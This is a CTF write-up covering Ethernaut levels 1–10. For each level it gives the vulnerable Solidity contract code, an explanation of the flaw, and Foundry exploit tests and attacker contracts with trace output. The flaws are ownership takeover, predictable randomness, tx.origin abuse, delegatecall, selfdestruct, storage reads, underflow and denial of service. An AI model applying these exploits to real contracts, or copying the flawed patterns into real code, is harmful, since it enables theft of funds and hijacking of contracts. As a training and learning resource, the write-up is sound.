# Ethernaut Challenges

🔗 **GitHub**: [View](https://github.com/BLOCK-PROGRAMR/SCATER70/tree/main/ctf/ethernaut)

## Level 1: Hello Ethernaut

### 🔍 Vulnerable Function
```solidity
function authenticate(string memory passkey) public {
    if (
        keccak256(abi.encodePacked(passkey)) ==
        keccak256(abi.encodePacked(password))
    ) {
        cleared = true;
    }
}
```

**Vulnerability**: The `password` variable is marked as `public`, which allows anyone to call `.password()` and get the secret directly.

### 🧪 Exploit Test
```solidity
function test_pass_attack() public {
    vm.startPrank(attacker);
    assertEq(resultpass, instance.password(), "password failed");

}

function test_attack() public {
    vm.startPrank(attacker);

    string memory result = instance.info();
    result = instance.info1();
    result = instance.info2("hello");
    result = instance.info42();
    result = instance.method7123949();

    instance.authenticate(password);

    bool cleared = instance.getCleared();
    assertTrue(cleared, "Authentication failed");
    vm.stopPrank();
}
```


---

## Level 2: Fallback

### 🔍 Vulnerable Function
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

**Vulnerability**: The fallback function allows any contributor to become the `owner` by sending ETH directly to the contract. The original `owner` logic is also flawed—it can be overtaken easily by minimal contributions.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();

    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    assertEq(_fallback.owner(), attacker, "Attacker is not the owner after fallback");
}

function test_withdraw() public {
    vm.startPrank(attacker2);
    _fallback.contribute{value: 0.0001 ether}();
    _fallback.contribute{value: 0.0001 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();
    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    uint256 balanceBefore = address(_fallback).balance;
    _fallback.withdraw();

    assertTrue(attacker.balance >= balanceBefore, "Attacker did not receive the funds");
    assertTrue(address(_fallback).balance == 0, "Contract balance is not zero after withdraw");
    vm.stopPrank();
}
```



---

## Level 3: Fallout

### 🔍 Vulnerable Function
```solidity
function Fal1out() public payable {
    owner = payable(msg.sender);
    allocations[owner] = msg.value;
}
```

**Vulnerability**: The function `Fal1out()` is incorrectly named. It looks like a constructor but is actually a public function. Anyone can call it and become the `owner`.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker2);
    _fallout.allocate{value: 2 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallout.Fal1out{value: 2 ether}();
    _fallout.collectAllocations();

    assertTrue(address(_fallout).balance == 0, "attacker balance should be 0");
    vm.stopPrank();
}
```



---

## Level 4: CoinFlip

### 🔍 Vulnerable Function
```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
```

**Vulnerability**: Uses predictable `blockhash` to generate randomness. The attacker can precompute the same value and always win the flip.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);

    for (uint256 i = 0; i < 10; i++) {
        vm.roll(block.number + 1);
        coinFlipAttack.attack();
    }

    assertEq(
        coinFlip.consecutiveWins(),
        10,
        "Attack failed to reach 10 wins"
    );

    vm.stopPrank();
}
```

---

## Level 5: Telephone

### 🔍 Vulnerable Function
```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

**Vulnerability**: The contract uses `tx.origin` instead of `msg.sender` for access control. An attacker can create a contract that calls this function, with the `tx.origin` being a user (player), and `msg.sender` being the attack contract. This bypasses the condition and changes the ownership.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    telephone.changeOwner(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}

function test_attack2() public {
    vm.startPrank(player);
    TelephoneExploit exploit = new TelephoneExploit(telephone);
    exploit.attack(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}
```



---

## Level 6:Delegation

### 🔍 Vulnerable Function

```solidity
fallback() external {
    (bool result, ) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
```

**Vulnerability**: The Delegation contract uses delegatecall to execute code from the Delegate contract within the context of its own storage. This means an attacker can call a function like pwn() on Delegation, which executes pwn() in Delegate and updates the owner of Delegation, not Delegate.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    (bool success, ) = address(delegation).call(
        abi.encodeWithSignature("pwn()")
    );
    require(success, "Call failed");
    assertEq(delegation.owner(), attacker, "Attacker is not the owner");
    vm.stopPrank();
}

```
---

## Level 7:Force

### 🔍 Vulnerable Function

```solidity
// Force contract has no receive/fallback or payable function
contract Force {
   
}
```

**Vulnerability**: Ether can still be forcibly sent using selfdestruct.

### 🛠️  Exploit Contract (ForceDestruct)
```solidity
 contract ForceDestruct {
    function attack(address payable _contract) public payable {
        selfdestruct(_contract);
    }
}

```

### 🧪 Exploit Test
```solidity 
    function test_attack() public {
    vm.startPrank(attacker);
    forceDestruct = new ForceDestruct();
    forceDestruct.attack{value: 1 ether}(payable(address(force)));
    assertEq(address(force).balance, 1 ether, "Force contract did not receive Ether");
    vm.stopPrank();
    }

```
### 🧪 Test Output
``` text
[PASS] test_attack() (gas: 131011)
Traces:
  [131011] level7Test::test_attack()
    ├─ VM::startPrank(attacker)
    ├─ new ForceDestruct
    ├─ ForceDestruct::attack{value: 1 ether}(Force)
    │   └─ [SelfDestruct]
    ├─ assertEq(1 ether, 1 ether)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 6.73ms
```
---


## Level 8:Valut

### 🔍 Vulnerable Function

```solidity
 bool public locked;//storage slot0
 bytes32 private password;//storage slot1
function unlock(bytes32 _password) public {
    if (password == _password) {
        locked = false;
    }
}

```

**Vulnerability**: Although password is marked as private, all contract storage is publicly accessible. In Solidity, the private keyword only restricts access within the Solidity language, not from the blockchain level. So, the password stored at storage slot 1 can be retrieved using vm.load.


### 🧪 Exploit Test
```solidity 
   function test_attack() public {
    vm.startPrank(attacker);
    // Get the password from storage slot 1
    bytes32 _password = vm.load(address(vault), bytes32(uint256(1)));
    vault.unlock(_password);
    assertFalse(vault.locked());
    vm.stopPrank();
}
```
### 🧪 Test Output
``` text
[PASS] test_attack() (gas: 11812)
Traces:
  [16612] VaultTest::test_attack()
    ├─ VM::startPrank(attacker)
    ├─ VM::load(Vault, slot 1)
    ├─ Vault::unlock(password)
    ├─ Vault::locked() → false
    ├─ VM::assertFalse(false)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 1.24ms
```
---


## Level 9:Token

### 🔍 Vulnerable Function

```solidity
 function transfer(address _to, uint256 _value) public returns (bool) {
    unchecked {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
    }
    return true;
}
```

**Vulnerability**: The transfer() function is written with an unchecked block, allowing underflow to occur. When a user transfers more tokens than they own, the subtraction balances[msg.sender] -= _value underflows and wraps around to a massive value (2**256 - x), resulting in an increased balance instead of failing.

📝 Note: This kind of underflow attack was possible before Solidity 0.8.x, which introduced built-in overflow/underflow protection.
To demonstrate this vulnerability in a controlled environment, unchecked is intentionally used to bypass that protection for educational purposes


### 🧪 Exploit Test
```solidity 
   function test_attack() public {
    vm.startPrank(player);
    
    // Initial balance of player: 20 tokens
    assertEq(token.balanceOf(player), 20);

    // Transfer more than balance (21 tokens), triggers underflow
    bool success = token.transfer(attacker, 21);
    assertTrue(success);

    // Player's balance underflows to a very large number
    uint256 _balanceofplayer = token.balanceOf(player);
    assertGt(_balanceofplayer, 20);

    vm.stopPrank();
}
```
### 🧪 Test Output
``` text
[PASS] test_attack() (gas: 47312)
Traces:
  [47312] TokenTest::test_attack()
    ├─ VM::startPrank(player)
    ├─ Token::balanceOf(player) → 20
    ├─ assertEq(20, 20)
    ├─ Token::transfer(attacker, 21) → true
    ├─ assertTrue(true)
    ├─ Token::balanceOf(player) → 1.157e77
    ├─ assertGt(1.157e77, 20)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 988.39µs
```
---

## Level 10:King
**AttackDesc**:
A Denial of Service (DoS) attack is when someone makes a smart contract stop working for others.
This usually happens if the contract sends Ether to a malicious address that always fails or reverts.
If one function fails because of this, others may not be able to use the contract.
In the King level, a smart contract becomes the king and blocks future kings by rejecting ETH.
This locks the contract and nobody else can play the game.
DoS attacks make the contract unusable for honest users.

### 🔍 Vulnerable Function

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value); // ❌ vulnerable to DoS
    king = msg.sender;
    prize = msg.value;
}

```

**Vulnerability**: The transfer call to the current king can fail if the king is a contract that reverts on receiving ETH. This leads to a Denial of Service (DoS) where no one can become king anymore.

### 🛠️  Exploit Contract (ForceDestruct)
```solidity
 contract Attacker {
    King public king;

    constructor(King _King) {
        king = _King;
    }

    function attack() public payable {
        require(msg.value >= address(king).balance, "Not enough balance");
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "transfer failed");
    }

    receive() external payable {
        revert("sent eth failed"); // Reverts to block
    }
}
```

### 🧪 Exploit Test
```solidity 
   function test_attack() public {
    vm.prank(attackerEOA);
    attack.attack{value: 2 ether}(); // attacker becomes king

    assertEq(king._king(), address(attack)); // ✅ attacker is king

    vm.prank(player);
    (bool success, ) = address(king).call{value: 3 ether}(""); // another player tries
    assertFalse(success, "Player should not be able to become king anymore"); // ❌ fails
}
```
### 🧪 Test Output
``` text
[PASS] test_attack() (gas: 71672)
Traces:
  [71672] KingTest::test_attack()
    ├─ VM::prank(attackerEOA)
    ├─ Attacker::attack{value: 2 ether}()
    │   ├─ King::receive{value: 2 ether}()
    │   │   ├─ player::fallback{value: 2 ether}()
    │   │   └─ [Stop]
    │   └─ [Stop]
    ├─ King::_king() → Attacker
    ├─ VM::assertEq(Attacker, Attacker)
    ├─ VM::prank(player)
    ├─ King::receive{value: 3 ether}()
    │   ├─ Attacker::receive{value: 3 ether}() → [Revert] sent eth failed
    │   └─ [Revert]
    ├─ VM::assertFalse(false, "Player should not be able to become king anymore")
    └─ [Stop]

Suite result: ok. 1 passed; 0 failed; finished in 15.46ms
```
---



✅ Ready for **Level 11** — coming soon!

